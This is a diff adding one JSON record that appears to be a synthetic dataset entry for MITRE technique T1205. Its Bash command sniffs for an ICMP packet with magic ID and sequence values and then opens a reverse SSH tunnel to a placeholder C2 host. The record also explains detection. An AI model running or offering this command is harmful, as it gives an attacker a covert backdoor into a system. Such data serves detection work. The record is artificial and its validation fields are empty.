@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo timeout 60 tcpdump -ln -i eth0 'icmp and icmp[4:2]=0xbeef and icmp[6:2]=0x1234' -c 1 >/dev/null && ssh -N -R 22022:localhost:22 user@c2.example",
+  "explanation": "Listens (requires sudo) for a single ICMP echo with magic identifier and sequence values (0xBEEF/0x1234). When observed, establishes a reverse SSH tunnel to a C2, effectively using the ICMP as a covert trigger. Detection: flag tcpdump invocation by non-admin users; IDS for ICMP packets with unusual id/seq patterns; monitor for unsolicited reverse SSH tunnels.",
+  "rationale_steps": [
+    "Passively sniff the LAN for a specific ICMP magic packet (sudo needed).",
+    "Use the packet as a signal to start a reverse SSH port-forward.",
+    "Maintain a covert channel through the reverse tunnel.",
+    "Detect by auditing tcpdump usage and ICMP field anomalies preceding SSH reverse tunnels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-9e1e4684-1bb34e3a",
+  "source_prompt_hash": "9e1e4684",
+  "timestamp_utc": "2025-09-30T05:53:05.592837Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
